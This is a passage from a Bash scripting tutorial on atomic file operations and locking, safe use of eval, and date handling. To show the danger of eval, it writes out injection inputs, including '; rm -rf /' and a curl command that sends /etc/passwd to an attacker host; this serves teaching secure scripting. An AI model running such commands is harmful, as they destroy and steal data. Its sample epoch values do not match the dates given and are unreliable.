2. Kernel writes "data\n" → file has content

Between steps 1 and 2, any process reading `file.txt` sees an **empty file**.
This is why `write_atomic` exists — use `mv` to swap, not `>` to overwrite.

#### Pipe Variable Loss

```bash
# NOT atomic in terms of state — variable modified in subshell, lost
count=0
cat file.txt | while read -r line; do
    (( count++ ))
done
echo "$count"   # still 0! — pipe creates subshell, count dies with it
```

---

### Atomic Creation — `mkdir`, `ln -s`, `set -C`

These syscalls are atomic because **they fail if the target already exists** — no check+create race.

#### `mkdir` as a Lock

```bash
# mkdir(2) is atomic — either creates or fails, no race window
acquire_lock() {
    local lockdir="$1"
    if mkdir "$lockdir" 2>/dev/null; then
        trap "rmdir '$lockdir'" EXIT
        return 0
    fi
    return 1
}

if ! acquire_lock /tmp/myapp.lock; then
    echo "Another instance running" >&2
    exit 1
fi
```

#### `ln -s` as a Lock

```bash
# symlink(2) is atomic — fails if link name exists
if ln -s $$ /tmp/mylock 2>/dev/null; then
    trap "rm -f /tmp/mylock" EXIT
    # got the lock — proceed
else
    echo "Locked by PID: $(readlink /tmp/mylock)" >&2
    exit 1
fi
```

Advantage over `mkdir`: the symlink target stores the **PID of the lock holder** — useful for debugging.

#### `set -C` / `noclobber` — Atomic PID File

```bash
set -C    # enable noclobber: > fails if file exists (uses O_EXCL | O_CREAT)
echo $$ > /var/run/myapp.pid   # fails if PID file already exists
set +C    # disable noclobber
```

`O_EXCL | O_CREAT` = kernel-guaranteed atomic "create only if it doesn't exist" — single syscall.

---

### `flock` — The Gold Standard

`flock` uses kernel-level advisory file locks. Unlike `mkdir`/`ln -s`, the kernel **automatically releases the lock when the process dies** — no stale locks.

```bash
# Method 1 — subshell flock
(
    flock -n 9 || { echo "already running"; exit 1; }
    # critical section — exclusively locked
    deploy_application
) 9>/var/lock/deploy.lock

# Method 2 — fd-based flock (reusable across script)
exec 200>/var/lock/deploy.lock
flock -n 200 || { echo "deploy already running"; exit 1; }
# ... entire script runs under lock ...
# lock released when fd 200 closes (script exit, crash, kill)

# Method 3 — blocking wait with timeout
flock -w 30 200 || { echo "timeout waiting for lock"; exit 1; }
# waits up to 30 seconds for lock to become available
```

#### flock Options

| Flag | Meaning |
|------|---------|
| `-n` | Non-blocking — fail immediately if can't lock |
| `-w N` | Wait up to N seconds for the lock |
| `-s` | Shared lock (multiple readers allowed) |
| `-x` | Exclusive lock (default) |
| `-u` | Unlock |

#### Why flock Beats mkdir/ln

| Property | `mkdir` / `ln -s` | `flock` |
|----------|-------------------|---------|
| Atomic creation | Yes | Yes |
| Stale lock risk | **Yes** — crash leaves dir/link behind | **No** — kernel auto-releases |
| Need cleanup trap | Yes | No |
| Blocking wait | Must implement manually | Built-in (`-w`) |
| Shared/exclusive | No | Yes (`-s` / `-x`) |
| NFS safe | No | No (use `lockfile` for NFS) |

---

### Atomic Counter — Combining flock + Read/Write

```bash
# Without locking — TOCTOU race, lost updates
count=$(cat counter.txt)
echo $((count + 1)) > counter.txt

# With flock — serialized access, no race
increment_counter() {
    (
        flock 9
        local count=$(cat counter.txt 2>/dev/null || echo 0)
        echo $((count + 1)) > counter.txt
    ) 9>/var/lock/counter.lock
}

# Multiple processes can call this safely
increment_counter
```

---

### Real DevOps — Atomic Config Deployment

```bash
# Full pattern: generate → validate → atomic swap → reload
generate_prometheus_config > /tmp/prometheus.yml.tmp

# Validate BEFORE swapping (fail fast)
promtool check config /tmp/prometheus.yml.tmp || {
    rm -f /tmp/prometheus.yml.tmp
    echo "FATAL: invalid Prometheus config" >&2
    exit 1
}

# Atomic swap — Prometheus never sees a half-written file
mv /tmp/prometheus.yml.tmp /etc/prometheus/prometheus.yml

# Reload — process re-reads the complete, valid config
kill -HUP "$(pidof prometheus)"
```

Without atomic swap, `kill -HUP` could trigger a reload while the file is still being written → Prometheus reads truncated YAML → crashloop.

---

### The `sync` / `fsync` Gap

Even after atomic `mv`, data may only be in the **kernel page cache**, not persisted to disk.

```bash
# For crash-safe writes (protecting against power failure, not concurrent reads):
write_crash_safe() {
    local target="$1" tmpfile
    tmpfile=$(mktemp "${target}.tmp.XXXXXX")
    cat > "$tmpfile"
    sync                        # flush ALL dirty pages to disk (heavy)
    mv "$tmpfile" "$target"
    sync                        # flush the directory entry rename to disk
}
```

In practice, **DevOps scripts almost never need `sync`** — the `mv` rename atomicity protects against concurrent readers, which is the actual problem. `sync` protects against power loss, which is a storage/HA concern.

---

### Summary — Atomic Operations Quick Reference

| Operation | Atomic? | Syscall | Key Detail |
|-----------|---------|---------|------------|
| `mv` (same fs) | **Yes** | `rename(2)` | Foundation of atomic file writes |
| `>>` (≤4096 bytes) | **Yes** | `write(2)` + `O_APPEND` | Multi-process safe up to `PIPE_BUF` |
| `>` (overwrite) | **No** | `open(O_TRUNC)` + `write` | File is empty between truncate and write |
| `mkdir` | **Yes** | `mkdir(2)` | Fails if exists — no TOCTOU |
| `ln -s` | **Yes** | `symlink(2)` | Fails if exists — stores PID in target |
| `set -C` + `>` | **Yes** | `open(O_EXCL\|O_CREAT)` | Atomic create-if-not-exists |
| `flock` | **Yes** | `flock(2)` | Kernel auto-releases on process death |
| `read` + `write` | **No** | Two syscalls | TOCTOU race — use `flock` to serialize |
| `test -f` + `touch` | **No** | Two syscalls | TOCTOU race — use `mkdir` or `ln -s` |

---

## 22. `eval` and Indirect Variables

`eval` takes a string, parses it **as if you typed it**, and executes the result. It's the most powerful and most dangerous command in shell.

---

### What `eval` Actually Does

```bash
# Normal execution: bash parses once
echo "hello world"

# eval: bash parses TWICE
cmd='echo "hello world"'
eval "$cmd"    # Step 1: eval sees the string 'echo "hello world"'
               # Step 2: bash re-parses and executes: echo "hello world"
```

The double-parse is the key. First pass: variable/command substitution. Second pass: the result is executed as a command.

```bash
# Without eval — literal string, not executed
x='echo hello'
$x              # works for simple cases BUT breaks with quotes, pipes, redirects

# These FAIL without eval
x='echo "hello world"'
$x              # tries to run: echo '"hello' 'world"' — wrong splitting

x='ls | grep txt'
$x              # tries to run: ls '|' grep txt — pipe not interpreted

# With eval — full re-parse, pipes/quotes/redirects all work
eval "$x"       # correctly runs: ls | grep txt
```

---

### When `eval` is Legitimately Useful

#### 1. Dynamic Variable Names (Indirect Reference)

```bash
# You have a variable whose NAME is stored in another variable
env="PROD"
varname="${env}_DATABASE_URL"

# Without eval — can't dereference
echo "$varname"              # prints: PROD_DATABASE_URL (the name, not the value)

# With eval
PROD_DATABASE_URL="postgres://prod-db:5432/app"
eval "value=\$$varname"
echo "$value"                # prints: postgres://prod-db:5432/app
```

Note the `\$` — the backslash delays expansion to the second parse:
- First parse: `\$` → `$`, `$varname` → `PROD_DATABASE_URL` → result: `value=$PROD_DATABASE_URL`
- Second parse: `$PROD_DATABASE_URL` → `postgres://prod-db:5432/app`

#### 2. Dynamic Command Construction

```bash
# Build a complex command from parts
sort_flags=""
[[ "$REVERSE" == "true" ]] && sort_flags+="-r "
[[ -n "$SORT_KEY" ]]       && sort_flags+="-k${SORT_KEY} "

eval "sort $sort_flags input.txt"
```

#### 3. SSH Remote Execution with Complex Quoting

```bash
# Quoting hell — need to preserve quotes across ssh
remote_cmd="awk '{print \$1, \$3}' /var/log/syslog | grep 'error'"
eval "ssh user@host \"$remote_cmd\""
```

---

### Why `eval` Is Dangerous — Code Injection

```bash
# VULNERABLE — user input directly in eval
read -r filename
eval "cat $filename"

# User types: ; rm -rf /
# eval sees: cat ; rm -rf /
# Executes: cat (fails), THEN rm -rf / — catastrophic
```

```bash
# VULNERABLE — variable from external source
TITLE=$(curl -s "https://api.example.com/title")
eval "echo $TITLE"
# If API returns: $(whoami) — eval executes it
# If API returns: ; curl attacker.com/steal?data=$(cat /etc/passwd) — data exfiltration
```

**Rule: NEVER use `eval` with untrusted input.** If the string contains user input, API responses, file contents, or anything not hardcoded — don't `eval` it.

---

### Safe Alternatives to `eval`

#### `declare -n` (bash 4.3+) — Nameref Variables

The modern, safe replacement for indirect variable references:

```bash
# Instead of: eval "value=\$$varname"
env="PROD"
PROD_DATABASE_URL="postgres://prod-db:5432/app"
PROD_API_KEY="secret123"

varname="${env}_DATABASE_URL"
declare -n ref="$varname"     # ref is now an ALIAS for PROD_DATABASE_URL
echo "$ref"                    # postgres://prod-db:5432/app

# Works for assignment too
ref="new-value"
echo "$PROD_DATABASE_URL"     # new-value — the original variable changed

# Loop over dynamic variable names
for suffix in DATABASE_URL API_KEY; do
    declare -n val="${env}_${suffix}"
    echo "${suffix}: ${val}"
done
# DATABASE_URL: postgres://prod-db:5432/app
# API_KEY: secret123
```

Why safer: `declare -n` only creates a reference — it doesn't execute arbitrary code.

#### `${!var}` — Indirect Expansion (bash 3+)

```bash
env="PROD"
PROD_DATABASE_URL="postgres://prod-db:5432/app"

varname="${env}_DATABASE_URL"
echo "${!varname}"             # postgres://prod-db:5432/app
```

- `${!varname}` = "expand the variable whose name is stored in `varname`"
- Read-only — can't assign through it (use `declare -n` for that)
- Simpler than `eval`, no code injection risk

```bash
# List all variables starting with a prefix
for var in "${!PROD_@}"; do
    echo "$var = ${!var}"
done
# PROD_DATABASE_URL = postgres://prod-db:5432/app
# PROD_API_KEY = secret123
```

`${!PREFIX@}` expands to all variable **names** starting with `PREFIX`.

#### Arrays Instead of Eval for Dynamic Commands

```bash
# WRONG — eval for command building
eval "$cmd $args"

# RIGHT — array preserves quoting, no eval needed
cmd=(kubectl get pods -n "$NAMESPACE" -l "app=$APP" -o json)
"${cmd[@]}"    # each array element becomes one argument, properly quoted

# Conditionally build command
cmd=(curl -sf)
[[ -n "$TOKEN" ]] && cmd+=(-H "Authorization: Bearer $TOKEN")
[[ "$VERBOSE" == "true" ]] && cmd+=(-v)
cmd+=("$URL")
"${cmd[@]}"
```

---

### `eval` vs Alternatives — Decision Table

| Need | Use | Don't Use |
|------|-----|-----------|
| Read dynamic variable name | `${!varname}` | `eval "echo \$$varname"` |
| Read + write dynamic variable | `declare -n ref="$varname"` | `eval "$varname=value"` |
| Build command with args | Array: `"${cmd[@]}"` | `eval "$cmd $args"` |
| Execute string as command | `eval "$cmd"` (only if fully trusted) | — |
| Process user input | Never eval | — |

---

### Real DevOps — When You'll Actually See `eval`

```bash
# 1. SSH agent setup — eval is standard here (output is from a trusted binary)
eval "$(ssh-agent -s)"
# ssh-agent prints: SSH_AUTH_SOCK=/tmp/ssh-xxx; export SSH_AUTH_SOCK; SSH_AGENT_PID=1234; ...
# eval executes those assignments in the current shell

# 2. Docker machine / env setup
eval "$(docker-machine env default)"

# 3. rbenv / pyenv / nvm init
eval "$(rbenv init -)"
eval "$(pyenv init -)"

# 4. direnv
eval "$(direnv hook bash)"
```

These are safe because the input comes from **trusted local binaries**, not user input.

```bash
# 5. Dynamic config loading (CAREFUL — only from trusted files)
# config.env contains: DB_HOST=localhost\nDB_PORT=5432
while IFS='=' read -r key value; do
    # Validate key is a safe variable name before eval
    if [[ "$key" =~ ^[a-zA-Z_][a-zA-Z0-9_]*$ ]]; then
        eval "$key='$value'"
    fi
done < config.env

# SAFER alternative — source the file directly
set -a          # auto-export all variables
source config.env
set +a
```

---

### Summary

```
eval = "execute this string as a shell command"

Power:    ██████████ — can do anything
Danger:   ██████████ — code injection if input is untrusted
Need:     ██░░░░░░░░ — rarely needed with modern bash

Prefer:
  ${!var}       for indirect reads
  declare -n    for indirect reads + writes
  arrays        for dynamic command building
  source        for loading config files

Only use eval when:
  ✓ Input is from a trusted binary (ssh-agent, docker-machine)
  ✓ You've validated/sanitized every variable in the string
  ✗ NEVER with user input, API responses, or file contents
```

---

## 23. Date/Time Handling

Bash has no date library. Everything goes through the `date` command or arithmetic on **epoch seconds**. Critical for log parsing, rotation scripts, SLA calculations, and deployment timestamps.

---

### Epoch Seconds — The Universal Clock

```bash
# Current epoch (seconds since 1970-01-01 00:00:00 UTC)
now=$(date +%s)
echo "$now"        # 1776268800

# Epoch is just an integer — arithmetic works naturally
one_hour_ago=$(( $(date +%s) - 3600 ))
one_day_ago=$(( $(date +%s) - 86400 ))
one_week_ago=$(( $(date +%s) - 604800 ))
```

**Why epoch?** Strings like "2026-04-14" can't be compared or subtracted. Epoch seconds are integers — math just works.

```bash
# Key time constants (memorize these)
# 1 minute  =     60
# 1 hour    =   3600
# 1 day     =  86400
# 1 week    = 604800
# 30 days   = 2592000
```

---

### Formatting Dates

```bash
# ISO 8601 — the only format you should use in scripts
date +%Y-%m-%dT%H:%M:%S%z           # 2026-04-14T10:30:00+0530
date -u +%Y-%m-%dT%H:%M:%SZ         # 2026-04-14T05:00:00Z  (UTC)

# Common formats
date +%Y-%m-%d                       # 2026-04-14
date +%Y%m%d                         # 20260414   (compact, good for filenames)
date +%H:%M:%S                       # 10:30:00
date "+%Y-%m-%d %H:%M:%S"           # 2026-04-14 10:30:00  (quotes needed for space)
date +%s                             # 1776268800  (epoch)

# For log filenames
LOGFILE="deploy-$(date +%Y%m%d-%H%M%S).log"  # deploy-20260414-103000.log

# Day of week, month name
date +%A                             # Tuesday
date +%B                             # April
date +%u                             # 2  (day of week: 1=Mon, 7=Sun)
```

#### Format Specifiers Quick Reference

| Specifier | Output | Example |
|-----------|--------|---------|
| `%Y` | 4-digit year | 2026 |
| `%m` | Month (01-12) | 04 |
| `%d` | Day (01-31) | 14 |
| `%H` | Hour 24h (00-23) | 10 |
| `%M` | Minute (00-59) | 30 |
| `%S` | Second (00-59) | 00 |
| `%s` | Epoch seconds | 1776268800 |
| `%z` | Timezone offset | +0530 |
| `%Z` | Timezone name | IST |
| `%u` | Day of week (1-7, Mon=1) | 2 |
| `%j` | Day of year (001-366) | 104 |
| `%F` | Shorthand for `%Y-%m-%d` | 2026-04-14 |
| `%T` | Shorthand for `%H:%M:%S` | 10:30:00 |

---

### Date Arithmetic — Computing Past/Future Dates

#### GNU `date` (Linux) — Has `-d` Flag

```bash
# Relative dates
date -d "yesterday" +%Y-%m-%d             # 2026-04-13
date -d "tomorrow" +%Y-%m-%d              # 2026-04-15
date -d "3 days ago" +%Y-%m-%d            # 2026-04-11
date -d "2 weeks" +%Y-%m-%d              # 2026-04-28
date -d "1 month ago" +%Y-%m-%d           # 2026-03-14
date -d "next friday" +%Y-%m-%d           # 2026-04-17

# Relative to a specific date
date -d "2026-04-01 + 30 days" +%Y-%m-%d  # 2026-05-01
date -d "2026-04-14 - 90 days" +%Y-%m-%d  # 2026-01-14

# Convert epoch to human-readable
date -d @1776268800 +%Y-%m-%d             # 2026-04-14
date -d @1776268800 "+%Y-%m-%d %H:%M:%S"  # 2026-04-14 05:00:00

# Convert date string to epoch
date -d "2026-04-14" +%s                  # 1776268800
```

#### macOS `date` — Different Syntax

```bash
# macOS uses -v for relative dates
date -v-1d +%Y-%m-%d                      # yesterday
date -v+3d +%Y-%m-%d                      # 3 days from now
date -v-1m +%Y-%m-%d                      # 1 month ago

# Convert epoch on macOS
date -r 1776268800 +%Y-%m-%d

# Portable alternative — use epoch arithmetic (works everywhere)
yesterday=$(date -d "yesterday" +%Y-%m-%d 2>/dev/null || date -v-1d +%Y-%m-%d 2>/dev/null)
```

---

### Duration Calculation

```bash
# How long did a command take?
start=$(date +%s)
run_deployment
end=$(date +%s)
duration=$(( end - start ))
echo "Deployment took ${duration}s"

# Human-readable duration
format_duration() {
    local seconds=$1
    local hours=$(( seconds / 3600 ))
    local minutes=$(( (seconds % 3600) / 60 ))
    local secs=$(( seconds % 60 ))
    printf "%02d:%02d:%02d" "$hours" "$minutes" "$secs"
}

start=$(date +%s)
run_migration
elapsed=$(( $(date +%s) - start ))
echo "Migration completed in $(format_duration $elapsed)"   # 01:23:45
```

#### Using `SECONDS` Built-in (Simpler)

```bash
# SECONDS auto-increments from the moment the script starts (or is reset)
SECONDS=0
run_deployment
echo "Took ${SECONDS}s"

# Reset mid-script
SECONDS=0
run_step_1
step1_time=$SECONDS

SECONDS=0
run_step_2
step2_time=$SECONDS

echo "Step 1: ${step1_time}s, Step 2: ${step2_time}s"
```

`SECONDS` is a bash built-in — no subprocess, no `date` call. Prefer it for simple timing.

---

### Timeout Patterns

```bash
# Wait with deadline (epoch-based)
wait_for_ready() {
    local service="$1"
    local timeout="${2:-120}"
    local deadline=$(( $(date +%s) + timeout ))

    until curl -sf "http://${service}/healthz" > /dev/null 2>&1; do
        if [[ $(date +%s) -gt $deadline ]]; then
            echo "ERROR: ${service} not ready after ${timeout}s" >&2
            return 1
        fi
        sleep 5
    done
    echo "${service} is ready"
}

wait_for_ready "myapp:8080" 300
```

```bash
# Retry with exponential backoff
retry_with_backoff() {
    local max_attempts="${1:?}"
    shift
    local attempt=1
    local delay=1

    until "$@"; do
        if (( attempt >= max_attempts )); then
            echo "FATAL: Failed after $attempt attempts" >&2
            return 1
        fi
        echo "Attempt $attempt failed, retrying in ${delay}s..." >&2
        sleep "$delay"
        (( attempt++ ))
        (( delay *= 2 ))   # 1, 2, 4, 8, 16...
    done
}

retry_with_backoff 5 kubectl apply -f deployment.yaml
```

---

### Log Timestamp Parsing

```bash
# Extract and compare timestamps from logs
# Common log format: "2026-04-14T10:30:00Z ERROR something broke"

# Find errors in the last hour
one_hour_ago=$(date -d "1 hour ago" +%Y-%m-%dT%H:%M:%S 2>/dev/null)
awk -v cutoff="$one_hour_ago" '$1 >= cutoff && /ERROR/' /var/log/app.log

# Count errors per hour
awk '/ERROR/ {print substr($1, 1, 13)}' /var/log/app.log | sort | uniq -c
# Output: 15 2026-04-14T09
#         23 2026-04-14T10

# Parse syslog timestamp to epoch (GNU date)
while IFS= read -r line; do
    ts=$(echo "$line" | grep -oP '^\S+')
    epoch=$(date -d "$ts" +%s 2>/dev/null) || continue
    if (( epoch > one_hour_ago_epoch )); then
        echo "$line"
    fi
done < /var/log/syslog
```

---

### File Age — How Old Is This File?

```bash
# File modification time in epoch
file_mtime=$(stat -c %Y "$file" 2>/dev/null || stat -f %m "$file" 2>/dev/null)
# -c %Y = GNU/Linux, -f %m = macOS

# File age in seconds
file_age=$(( $(date +%s) - file_mtime ))

# Delete files older than 7 days (pure bash, no find)
max_age=$(( 7 * 86400 ))
for f in /var/log/app/*.log; do
    [[ ! -f "$f" ]] && continue
    mtime=$(stat -c %Y "$f" 2>/dev/null) || continue
    age=$(( $(date +%s) - mtime ))
    if (( age > max_age )); then
        rm -f "$f"
        echo "Deleted: $f (age: $(( age / 86400 )) days)"
    fi
done

# Same thing with find (simpler for this use case)
find /var/log/app -name "*.log" -mtime +7 -delete
```

---

### Log Rotation with Timestamps

```bash
# Rotate log with timestamp suffix
rotate_log() {
    local logfile="${1:?logfile required}"
    local timestamp
    timestamp=$(date +%Y%m%d-%H%M%S)

    if [[ -f "$logfile" ]]; then
        mv "$logfile" "${logfile}.${timestamp}"
        gzip "${logfile}.${timestamp}"
        touch "$logfile"   # create fresh empty log
        echo "Rotated: ${logfile} → ${logfile}.${timestamp}.gz"
    fi
}

rotate_log /var/log/myapp/app.log

# Cleanup rotated logs older than 30 days
find /var/log/myapp -name "*.gz" -mtime +30 -delete
```

---

### Comparing Dates

```bash
# Compare two dates — convert to epoch first
deploy_date="2026-04-10"
today="2026-04-14"

deploy_epoch=$(date -d "$deploy_date" +%s)
today_epoch=$(date -d "$today" +%s)

days_since=$(( (today_epoch - deploy_epoch) / 86400 ))
echo "Deployed $days_since days ago"   # 4

# Check if certificate expires within 30 days
cert_expiry=$(openssl x509 -enddate -noout -in cert.pem | cut -d= -f2)
expiry_epoch=$(date -d "$cert_expiry" +%s)
now_epoch=$(date +%s)
days_left=$(( (expiry_epoch - now_epoch) / 86400 ))

if (( days_left < 30 )); then
    echo "WARN: Certificate expires in $days_left days" >&2
fi
```

---

### Gotchas

```bash
# 1. Timezone matters — always be explicit
date +%s                    # epoch is ALWAYS UTC regardless of local TZ
date +%H:%M                # local time — can vary across servers
date -u +%H:%M             # UTC — consistent everywhere
TZ=UTC date +%H:%M         # explicit UTC

# 2. macOS vs Linux date syntax — NOT compatible
# Linux: date -d "2026-04-14" +%s
# macOS: date -j -f "%Y-%m-%d" "2026-04-14" +%s
# Portable: use epoch arithmetic or check OS first

# 3. Don't parse `date` output as a string for comparison
[[ "2026-04-14" > "2026-04-13" ]]    # happens to work for ISO 8601 (lexicographic = chronological)
[[ "Apr 14" > "Apr 9" ]]             # WRONG — "9" > "1" lexicographically but Apr 9 < Apr 14
# Always convert to epoch for reliable comparison

# 4. Leap seconds / DST — epoch handles them, string comparison doesn't
# Epoch is monotonic. Date strings can have gaps (DST spring forward) or repeats (fall back).

# 5. SECONDS resets on source
source script.sh    # SECONDS may reset depending on context
# Use epoch arithmetic for cross-script timing
```

---

### Quick Reference

```bash
# Get current time
date +%s                              # epoch
date +%F                              # 2026-04-14
date "+%F %T"                         # 2026-04-14 10:30:00
date -u +%FT%TZ                       # 2026-04-14T05:00:00Z (UTC ISO 8601)

# Time arithmetic
$(( $(date +%s) - 3600 ))             # 1 hour ago (epoch)
date -d "1 hour ago" +%F              # 1 hour ago (formatted, Linux only)

# Duration
SECONDS=0; command; echo "${SECONDS}s"  # simplest timing

# Convert epoch ↔ date
date -d @1776268800 +%F               # epoch → date (Linux)
date -d "2026-04-14" +%s              # date → epoch (Linux)

# File age
$(( $(date +%s) - $(stat -c %Y file) ))
```
